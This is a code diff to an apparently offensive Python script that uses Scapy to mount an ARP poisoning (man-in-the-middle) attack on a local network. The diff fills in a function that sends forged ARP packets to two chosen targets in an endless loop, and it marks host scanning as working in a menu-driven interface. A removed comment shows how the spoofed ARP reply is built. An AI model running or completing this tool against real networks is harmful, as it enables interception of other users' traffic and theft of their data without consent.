@@ -57,8 +57,13 @@ def scan_targets():
     except subprocess.CalledProcessError:
         return "Error scanning targets"
 
-def exploit_arp_poisoning(packet):
-
+def exploit_arp_poisoning(packet_to_t1, packet_to_t2):
+    try:
+        while(True):
+            sendp(packet_to_t1, iface=interface) 
+            sendp(packet_to_t2, iface=interface) 
+    except KeyboardInterrupt:
+        pass
 
 
 interface = select_interface()
@@ -66,7 +71,7 @@ mac = get_mac(interface)
 option = -1
 while(option!=4):
     print("1. Enter targets manually")
-    print("2. Scan hosts on the network (Not working)")
+    print("2. Scan hosts on the network")
     print("3. Run")
     print("4. Exit")
     option = int(input())
@@ -95,6 +100,3 @@ while(option!=4):
         packet_to_t2 = t2_a/t2_b
         exploit_arp_poisoning(packet_to_t1, packet_to_t2)
 
-
-# a = Ether()
-# b = ARP(hwlen=6, plen=4, op=2, hwsrc=mac, psrc=target_1)
